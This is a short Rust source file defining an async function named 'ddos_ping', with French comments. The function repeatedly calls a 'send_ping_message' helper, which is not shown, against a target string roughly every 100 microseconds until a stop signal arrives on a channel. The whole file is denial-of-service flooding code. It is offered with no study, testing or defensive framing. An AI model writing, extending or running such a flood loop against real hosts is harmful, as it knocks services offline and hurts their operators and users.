use std::time::Duration;
use tokio::sync::mpsc;
use tokio::time::sleep;

pub(crate) async fn ddos_ping(rx: &mut mpsc::Receiver<()>, target_clone: String) {
    let mut cmp = 0;

    loop {
        tokio::select! {
            _ = sleep(Duration::from_nanos(100000)) => {
                println!("cmp = {}", cmp);
                send_ping_message(&target_clone).await.expect("Erreur lors de l'envoi du message PING");
                cmp += 1;
            }
            _ = rx.recv() => {
                // Arrêter d'afficher des messages lorsque le signal est reçu
                println!("Arret fin du temps");
                break;
            }
        }
    }
}